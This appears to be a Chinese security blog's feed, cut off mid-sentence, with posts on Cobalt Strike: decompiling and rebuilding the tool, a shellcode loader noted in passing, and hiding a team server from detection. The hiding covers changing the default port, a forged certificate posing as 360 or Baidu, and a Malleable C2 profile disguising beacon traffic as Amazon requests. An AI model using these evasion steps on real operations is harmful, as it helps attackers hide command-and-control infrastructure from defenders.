src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116115534263.png" alt="image-20211116115534263"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116115540028.png" alt="image-20211116115540028"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首先我们来看一张流程图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123201045600.png&quot; alt=&quot;image-20211123201045600&quot;&gt;&lt;/p&gt;
&lt;p&gt;首先打开IDA进行查看&lt;/p&gt;
&lt;p&gt;进入主函数，主要看sub_401840()函数进行查看&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112185819017.png&quot; alt=&quot;image-20211112185819017&quot;&gt;&lt;/p&gt;
&lt;p&gt;进入函数发现，首先获取系统时间戳，然后拼接字符串和创建线程通过管道读取shellcode，最后执行shellcode&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114141830161.png&quot; alt=&quot;image-20211114141830161&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://www.ol4three.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="C2" scheme="http://www.ol4three.com/tags/C2/"/>
    
      <category term="Cobalt Strike" scheme="http://www.ol4three.com/tags/Cobalt-Strike/"/>
    
  </entry>
  
  <entry>
    <title>CobaltStrike二开环境初探</title>
    <link href="http://www.ol4three.com/2021/11/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/CobaltStrike%E4%BA%8C%E5%BC%80%E7%8E%AF%E5%A2%83%E5%88%9D%E6%8E%A2/"/>
    <id>http://www.ol4three.com/2021/11/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/CobaltStrike%E4%BA%8C%E5%BC%80%E7%8E%AF%E5%A2%83%E5%88%9D%E6%8E%A2/</id>
    <published>2021-11-09T03:12:55.000Z</published>
    <updated>2022-07-22T10:09:19.442Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我们使用CobaltStrike的时候，进行性的需要进行二次开发，使其对应的功能更加丰富，更加方便我们团队联合进行渗透的稳定性和隐蔽性。</p><img src="https://kosakd.top/2021/05/05/CobaltStrike%E6%95%99%E7%A8%8B/2.png" alt="2" style="zoom:50%;"><h1 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h1><blockquote><p><code>IntelliJ IDEA</code> 自带了一个反编译java的工具，有时候我们需要对 <code>cobaltstrike</code> 的整个 <code>jar</code> 包进行反编译，使用这个 <code>IntelliJ IDEA</code> 双击之类的反编译时要是对整个源码层面进行搜索并不是很方便，可使用其自带的反编译工具，可以做到批量的整个反编译。</p><p>这里先在 <code>IntelliJ IDEA</code> 安装目录找到 <code>java-decompiler.jar</code> 拷贝到一个准备好的目录，并且新建两个文件，一个 <code>cs_bin</code> 里面放未反编译的 <code>cobaltstrike</code> 再建一个 <code>cs_src</code> 文件，这个是空文件，是为了之后放反编译后的 <code>cobaltstrike</code></p></blockquote><a id="more"></a><p>在对应目录下进行拷贝</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;Applications&#x2F;IntelliJ IDEA.app&#x2F;Contents&#x2F;plugins&#x2F;java-decompiler&#x2F;lib&#x2F;java-decompiler.jar</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109112414086.png" alt="image-20211109112414086"></p><p>进入到java-decompiler中找到decompiler的路径，提取出来</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;org&#x2F;jetbrains&#x2F;java&#x2F;decompiler&#x2F;IdeaDecompiler$LegalBurden.class</span><br></pre></td></tr></table></figure><p>将所有的反斜杠替换成.随之再其后加上ConsoleDecompilers，如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">org.jetbrains.java.decompiler.IdeaDecompiler$LegalBurden.class.ConsoleDecompilers</span><br></pre></td></tr></table></figure><p>因为MANIFEST.MF中是没有main class属性，没有制定主类，所以不能直接使用<code>java -jar</code>，如果想要直接执行Java包中具体的类，要使用java -cp输入如下命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler</span><br></pre></td></tr></table></figure><p>执行的时候会有提示</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler</span><br><span class="line">Usage: java -jar fernflower.jar [-&lt;option&gt;&#x3D;&lt;value&gt;]* [&lt;source&gt;]+ &lt;destination&gt;</span><br><span class="line">Example: java -jar fernflower.jar -dgs&#x3D;true c:\my\source\ c:\my.jar d:\decompiled\</span><br></pre></td></tr></table></figure><p>让你加上<code>-dgs=true</code>之后加上反编译的cobaltstrike和反编译之后要把结果放入的目录，输入：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs&#x3D;true cs_bin&#x2F;cobaltstrike.jar cs_src&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109114350746.png" alt="image-20211109114350746"></p><p>反编译完成后，会自动打包成jar包，右键解压后打开可以看到都是.java了，反编译出来就可以直接放入IntelliJ IDEA中，可直接搜索代码和相关的代码交叉引用。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109114720498.png" alt="image-20211109114720498"></p><h1 id="IDEA二次开发环境构造"><a href="#IDEA二次开发环境构造" class="headerlink" title="IDEA二次开发环境构造"></a>IDEA二次开发环境构造</h1><p>打开IDEA选择Create New Project 一直选择Next，创建好后，先建立两个文件夹<code>decompiled_src</code>文件夹，之后再建立一个<code>lib</code>文件夹。将反编译好的CobaltStrike复制到decompiled_src中，然后把它解压出来</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109120423523.png" alt="image-20211109120423523" style="zoom:50%;"><p>然后把原始的未反编译的CobaltStrike放到刚刚新建的lib中去</p><p>结下来我们要对这个项目进行设置，点击<code>File</code>中的<code>Project Structure</code>在<code>Modules</code>对<code>Dependencies</code>进行设置.</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109120705932.png" alt="image-20211109120705932"></p><p>选择lib中的cobalt strike.jar， 确认是Compile之后勾选一下，然后选择Apply。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109120959418.png" alt="image-20211109120959418"></p><p>依赖关系设置完成后，进入Artifacts——&gt;JAR——&gt;From modules with dependencies</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109121200835.png" alt="image-20211109121200835"></p><p>这里需要填写一个Main Class，去lib中的META-INF里面双击MANIFEST.MF</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109121328249.png" alt="image-20211109121328249"></p><p>复制aggressor.Aggressor，再次打开选择OK这里就设置完成了。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109121447940.png" alt="image-20211109121447940"></p><p>接下来再decompiled_src中找到已经反编译完的aggressor主类，右键选择Refactor –Copy File</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109122002190.png" alt="image-20211109122002190"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109122051094.png" alt="image-20211109122051094"></p><p>在To directory点击添加，选择之前创建的src在其中提阿健一个aggressor名字要一致，最后点击OK</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109122242765.png" alt="image-20211109122242765"></p><p>这样aggressor就自动的被拷贝到src目录里去了，这里可以看一下</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109160037402.png" alt="image-20211109160037402"></p><p>试着修改一下文档，保存。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109160235084.png" alt="image-20211109160235084"></p><p>到这里我们基本的准备工作就完成了，之后我们需要修改哪个文件，就可以在完整的源码中找到那个文件，然后邮件Refactor后然Copy File到这个目录进行修改，修改完成之后就可以选Build–&gt;Build Artifacts–&gt;Build进行编译</p><p>当提示<code>Build completed successfully in 4 s 670 ms</code>会在out文件夹生成我们编译好的SecondC2.jar</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109161214075.png" alt="image-20211109161214075"></p><p>在每次调试运行的时候，不需要切换到命令行环境，可以直接配置对应的参数如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109161644494.png" alt="image-20211109161644494"></p><p>最后在Run中选择Run C2级可以看到消息窗口</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109161624209.png" alt="image-20211109161624209" style="zoom:50%;"><p>点击确认，发现弹出提示，点击确定</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109161817082.png" alt="image-20211109161817082"></p><p>拿出<code>-XX:+AggressuveHeap</code>复制并放到Run-&gt;Profile中的VM options中</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109162250841.png" alt="image-20211109162250841"></p><p>再次运行，再次复制<code>-XX:+UseParallelGC</code>继续添加到VM options中，记得要用空格隔开。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109162419743.png" alt="image-20211109162419743"></p><p>再次运行，提示缺少.auth文件</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109162720558.png" alt="image-20211109162720558"></p><p>这里把初始的cobaltstrike.auth文件复制到SecondC2.jar同目录下。</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109163005947.png" alt="image-20211109163005947" style="zoom:33%;"><p>最后运行，就可以成功启动，接下来根据我们对应的需求，在项目中就行关键字搜索就可以定位到相关功能的代码处，从而进行相应的修改，或做一些功能上的增强。</p><p><a href="https://github.com/OL4THREE/Practice-Note/blob/main/CobaltStrike二开环境初探/SecondC2.zip">完整下载地址</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;我们使用CobaltStrike的时候，进行性的需要进行二次开发，使其对应的功能更加丰富，更加方便我们团队联合进行渗透的稳定性和隐蔽性。&lt;/p&gt;
&lt;img src=&quot;https://kosakd.top/2021/05/05/CobaltStrike%E6%95%99%E7%A8%8B/2.png&quot; alt=&quot;2&quot; style=&quot;zoom:50%;&quot;&gt;

&lt;h1 id=&quot;反编译&quot;&gt;&lt;a href=&quot;#反编译&quot; class=&quot;headerlink&quot; title=&quot;反编译&quot;&gt;&lt;/a&gt;反编译&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;IntelliJ IDEA&lt;/code&gt; 自带了一个反编译java的工具，有时候我们需要对 &lt;code&gt;cobaltstrike&lt;/code&gt; 的整个 &lt;code&gt;jar&lt;/code&gt; 包进行反编译，使用这个 &lt;code&gt;IntelliJ IDEA&lt;/code&gt; 双击之类的反编译时要是对整个源码层面进行搜索并不是很方便，可使用其自带的反编译工具，可以做到批量的整个反编译。&lt;/p&gt;
&lt;p&gt;这里先在 &lt;code&gt;IntelliJ IDEA&lt;/code&gt; 安装目录找到 &lt;code&gt;java-decompiler.jar&lt;/code&gt; 拷贝到一个准备好的目录，并且新建两个文件，一个 &lt;code&gt;cs_bin&lt;/code&gt; 里面放未反编译的 &lt;code&gt;cobaltstrike&lt;/code&gt; 再建一个 &lt;code&gt;cs_src&lt;/code&gt; 文件，这个是空文件，是为了之后放反编译后的 &lt;code&gt;cobaltstrike&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://www.ol4three.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="C2" scheme="http://www.ol4three.com/tags/C2/"/>
    
      <category term="Cobalt Strike" scheme="http://www.ol4three.com/tags/Cobalt-Strike/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strike特征隐藏与流量分析</title>
    <link href="http://www.ol4three.com/2021/10/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/Cobalt-Strike%E7%89%B9%E5%BE%81%E9%9A%90%E8%97%8F%E4%B8%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <id>http://www.ol4three.com/2021/10/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/Cobalt-Strike%E7%89%B9%E5%BE%81%E9%9A%90%E8%97%8F%E4%B8%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
    <published>2021-10-28T08:22:53.000Z</published>
    <updated>2021-11-23T12:04:31.541Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Cobalt-Strike简介"><a href="#Cobalt-Strike简介" class="headerlink" title="Cobalt Strike简介"></a>Cobalt Strike简介</h1><p>Cobalt Strike is software for Adversary Simulations and Red Team Operations. Cobalt Strike 简称CS， <a href="https://blog.ateam.qianxin.com/CobaltStrike4.0用户手册_中文翻译.pdf">A-team详细介绍使用网址</a>。CS是一款优秀的后渗透工具，可以在获取主机权限后进行长久权限维持，快速进行内网提权，凭据导出等。在后渗透中如果未修改特征，容易被流量审计设备监控，被蓝队溯源。</p><p>Cobalt Strike 是一个为对手模拟和红队行动而设计的平台，主要用于执行有目标的攻击和模拟高级威胁 者的后渗透行动。本章中会概述 Cobalt Strike 的功能集和相关的攻击流程。在本手册的剩余部分中会 详细的讨论这些功能。</p><a id="more"></a><h1 id="Cobalt-Strike的特征"><a href="#Cobalt-Strike的特征" class="headerlink" title="Cobalt Strike的特征"></a>Cobalt Strike的特征</h1><p>teamserver主控端使用的加密证书</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面&#x2F;cobaltstrike4.0# ls -l</span><br><span class="line">总用量 27748</span><br><span class="line">-rwxrw-rw- 1 root root      126 12月  5  2019 agscript</span><br><span class="line">-rwxrw-rw- 1 root root      144 12月  5  2019 c2lint</span><br><span class="line">-rwxrw-rw- 1 root root      256 1月  25  2020 cobaltstrike.auth</span><br><span class="line">-rwxrw-rw- 1 root root   785468 3月  15  2019 CobaltstrikeCN.jar</span><br><span class="line">-rwxrw-rw- 1 root root 27487620 3月  20  2020 cobaltstrike.jar</span><br><span class="line">-rwxrw-rw- 1 root root     2315 3月  17  2019 cobaltstrike.store</span><br><span class="line">-rwxrw-rw- 1 root root    96104 12月  5  2019 icon.jpg</span><br><span class="line">-rwxrw-rw- 1 root root      141 12月  5  2019 peclone</span><br><span class="line">-rwxrw-rw- 1 root root      141 3月  19  2020 start.bat</span><br><span class="line">-rwxrw-rw- 1 root root      108 3月  19  2020 start.sh</span><br><span class="line">-rwxrw-rw- 1 root root     1865 3月  19  2020 teamserver</span><br><span class="line">-rwxrw-rw- 1 root root     2005 3月  19  2020 teamserver.bat</span><br><span class="line">drwxr-xr-x 2 root root     4096 10月 13 14:41 third-party</span><br></pre></td></tr></table></figure><p>这里的cobalstrike.store里面的证书是用来teamserver主控端使用的加密证书(默认端口50050)，而不是主机上线的时候使用的</p><p>特征很容易看到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keytool -list -v -keystore cobaltstrike.store</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028162530859.png" alt="image-20211028162530859"></p><p>我们去fofa进行搜索可以发现大量服务端机器</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">port&#x3D;&quot;50050&quot; &amp;&amp; cert&#x3D;&quot;cobaltstrike&quot;</span><br></pre></td></tr></table></figure><p>![image-20211028162701322](../../../../../../Library/Application Support/typora-user-images/image-20211028162701322.png)</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028162745166.png" alt="image-20211028162745166"></p><p>我们也可以使用指纹来查询哪些是cobaltStrike的服务器，下面是4.0的证书指纹</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028162818883.png" alt="image-20211028162818883"></p><p>可以到censys去查询该证书</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7B49FC589E7E738E3457859D269996ECEF83F693570B0AC482C426B1FA04BD73</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028162903879.png" alt="image-20211028162903879"></p><p>也可以查看使用此证书的主机</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028162934208.png" alt="image-20211028162934208"></p><h1 id="去除特征的几种方法"><a href="#去除特征的几种方法" class="headerlink" title="去除特征的几种方法"></a>去除特征的几种方法</h1><h2 id="修改默认端口号"><a href="#修改默认端口号" class="headerlink" title="修改默认端口号"></a>修改默认端口号</h2><p>第一种是直接编辑teamserver进行启动项修改。./teamserver 1.1.1.1 password 直接修改teamserver vim teamserver</p><p>编辑teamserver文件 搜索server_port</p><p>修改端口为12345</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028163024781.png" alt="image-20211028163024781"></p><p>再次访问发现端口已经修改</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028163051513.png" alt="image-20211028163051513"></p><h2 id="修改默认SSL证书"><a href="#修改默认SSL证书" class="headerlink" title="修改默认SSL证书"></a>修改默认SSL证书</h2><p>存在的特征，需要重新创建一个新的不一样的证书。</p><p>使用以下命令创建证书</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keytool -keystore cobaltstrike.store -storepass 密码 -keypass 密码 </span><br><span class="line">-genkey -keyalg RSA -alias google.com -dname &quot;CN&#x3D;(名字与姓氏),</span><br><span class="line"> OU&#x3D;(组织单位名称), O&#x3D;(组织名称), L&#x3D;(城市或区域名称), </span><br><span class="line"> ST&#x3D;(州或省份名称), C&#x3D;(单位的两字母国家代码)&quot;</span><br></pre></td></tr></table></figure><p>比如修改为百度或者360</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">360</span><br><span class="line">keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 360.com -dname &quot;CN&#x3D;US, OU&#x3D;360.com, O&#x3D;Sofaware, L&#x3D;Somewhere, ST&#x3D;Cyberspace, C&#x3D;CN&quot;</span><br><span class="line"></span><br><span class="line">baidu</span><br><span class="line">keytool -keystore cobaltStrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias baidu.com -dname &quot;CN&#x3D;ZhongGuo, OU&#x3D;CC, O&#x3D;CCSEC, L&#x3D;BeiJing, ST&#x3D;ChaoYang, C&#x3D;CN&quot;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028163409229.png" alt="image-20211028163409229"></p><p>再次运行发现 证书已经改变特征已经为360公司</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028163438037.png" alt="image-20211028163438037"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028163540010.png" alt="image-20211028163540010"></p><h2 id="HTTP流量"><a href="#HTTP流量" class="headerlink" title="HTTP流量"></a>HTTP流量</h2><p>在使用Cobalt Strike HTTP进行对应通信的时候，我们使用wireshark来抓取HTTP协议。包括请求的固定地址，请求头等等。可以看到一些固定的请求信息特征可以查看到。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211110173257064.png" alt="image-20211110173257064"></p><p>对应的Malleable-C2-Profiles配置文件由此而来，它允许我们仅通过一个简单的配置文件来改变Beacon和cobaltstrike通信时的流量特征和行为。</p><p><a href="https://github.com/rsmudge/Malleable-C2-Profiles">https://github.com/rsmudge/Malleable-C2-Profiles</a></p><p>在github上有师傅给出了一些APT 和正常厂商对应行为的配置文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set sleeptime &quot;5000&quot;;</span><br><span class="line">set jitter    &quot;0&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; Trident&#x2F;7.0; rv:11.0) like Gecko&quot;;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;s&#x2F;ref&#x3D;nb_sb_noss_1&#x2F;167-3294888-0262949&#x2F;field-keywords&#x3D;books&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        header &quot;Host&quot; &quot;www.amazon.com&quot;;</span><br><span class="line"></span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;session-token&#x3D;&quot;;</span><br><span class="line">            prepend &quot;skin&#x3D;noskin;&quot;;</span><br><span class="line">            append &quot;csm-hit&#x3D;s-24KU11BB82RZSYGJ3BDK|1419899012996&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Server&quot; &quot;Server&quot;;</span><br><span class="line">        header &quot;x-amz-id-1&quot; &quot;THKUYEZKCKPGY5T42PZT&quot;;</span><br><span class="line">        header &quot;x-amz-id-2&quot; &quot;a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo&#x3D;&quot;;</span><br><span class="line">        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;</span><br><span class="line">        header &quot;Content-Encoding&quot; &quot;gzip&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line">    </span><br><span class="line">    set uri &quot;&#x2F;N4215&#x2F;adj&#x2F;amzn.us.sr.aps&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text&#x2F;xml&quot;;</span><br><span class="line">        header &quot;X-Requested-With&quot; &quot;XMLHttpRequest&quot;;</span><br><span class="line">        header &quot;Host&quot; &quot;www.amazon.com&quot;;</span><br><span class="line"></span><br><span class="line">        parameter &quot;sz&quot; &quot;160x600&quot;;</span><br><span class="line">        parameter &quot;oe&quot; &quot;oe&#x3D;ISO-8859-1;&quot;;</span><br><span class="line"></span><br><span class="line">        id &#123;</span><br><span class="line">            parameter &quot;sn&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parameter &quot;s&quot; &quot;3717&quot;;</span><br><span class="line">        parameter &quot;dc_ref&quot; &quot;http%3A%2F%2Fwww.amazon.com&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Server&quot; &quot;Server&quot;;</span><br><span class="line">        header &quot;x-amz-id-1&quot; &quot;THK9YEZJCKPGY5T42OZT&quot;;</span><br><span class="line">        header &quot;x-amz-id-2&quot; &quot;a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo&#x3D;&quot;;</span><br><span class="line">        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;</span><br><span class="line">        header &quot;x-ua-compatible&quot; &quot;IE&#x3D;edge&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过c2lint来检测该文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ .&#x2F;c2lint amazon.profile</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">default</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">http-get</span><br><span class="line">--------</span><br><span class="line">GET &#x2F;s&#x2F;ref&#x3D;nb_sb_noss_1&#x2F;167-3294888-0262949&#x2F;field-keywords&#x3D;books HTTP&#x2F;1.1</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Host: www.amazon.com</span><br><span class="line">Cookie: skin&#x3D;noskin;session-token&#x3D;lCZcYm9qlpy8hT41NUthoA&#x3D;&#x3D;csm-hit&#x3D;s-24KU11BB82RZSYGJ3BDK|1419899012996</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; Trident&#x2F;7.0; rv:11.0) like Gecko</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: Server</span><br><span class="line">x-amz-id-1: THKUYEZKCKPGY5T42PZT</span><br><span class="line">x-amz-id-2: a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo&#x3D;</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Length: 64</span><br><span class="line"></span><br><span class="line">*..[..6..8...Q|?...,V...Md...f..m.8y.....f.E...Ho..pOy....C..&#123;^.</span><br><span class="line"></span><br><span class="line">http-post</span><br><span class="line">---------</span><br><span class="line">POST &#x2F;N4215&#x2F;adj&#x2F;amzn.us.sr.aps?sz&#x3D;160x600&amp;oe&#x3D;oe&amp;sn&#x3D;24791&amp;s&#x3D;3717&amp;dc_ref&#x3D;http%3A%2F%2Fwww.amazon.com HTTP&#x2F;1.1</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Host: www.amazon.com</span><br><span class="line">Content-Length: 24</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; Trident&#x2F;7.0; rv:11.0) like Gecko</span><br><span class="line"></span><br><span class="line">29Mivrcb3fH6Gw0cZioEMA&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: Server</span><br><span class="line">x-amz-id-1: THK9YEZJCKPGY5T42OZT</span><br><span class="line">x-amz-id-2: a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo&#x3D;</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">x-ua-compatible: IE&#x3D;edge</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p>可以看到我们对应的伪造请求，再次启动teamserver，抓取对应流量包</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211110173336803.png" alt="image-20211110173336803"></p><p>我们可以看到对应的特征信息已经修改</p><h2 id="HTTPS流量"><a href="#HTTPS流量" class="headerlink" title="HTTPS流量"></a>HTTPS流量</h2><p>对于HTTPS流量我们是们Wireshark进行抓取</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211110175624766.png" alt="image-20211110175624766"></p><p>我们可以找到对应的证书数据包，导出对应的分组字节流, <code>Export selected Packet Bytes</code></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211110180152205.png" alt="image-20211110180152205"></p><p>计算证书的SHA256值，并在censys.io进行搜索</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ sha256sum https.cer                                                                         </span><br><span class="line">87f2085c32b6a2cc709b365f55873e207a9caa10bffecf2fd16d3cf9d94d390c  https.cer</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211110181534376.png" alt="image-20211110181534376"></p><p>可以看到使用该默认证书的主机</p><p>同时在Client Hello数据包中同样也存在</p><blockquote><p>TLS客户端进行指纹识别的思想，最初来自于<a href="https://twitter.com/synackpse">Lee Brotherston</a>于2015年的一项研究成果，对这项研究感兴趣的读者可以参阅<a href="https://blog.squarelemon.com/tls-fingerprinting/">这里</a>；与该思想相关的DerbyCon演讲可以参阅<a href="https://www.youtube.com/watch?v=XX0FRAy2Mec">这里</a>。</p><p>我们知道，不仅”良性的”应用程序会使用TLS及其前身SSL对其流量进行加密，而且恶意软件也常常这样做；前者这样做的目的是确保数据安全，而后者这样做的目的则是将其流量隐藏在噪声中。为了启动TLS会话，客户端将在TCP 3次握手后发送TLS客户端的Hello数据包。这个数据包及其生成方式取决于构建客户端应用程序时所使用的软件包和方法。如果接受TLS连接，服务器将使用基于服务器端库和配置以及Client 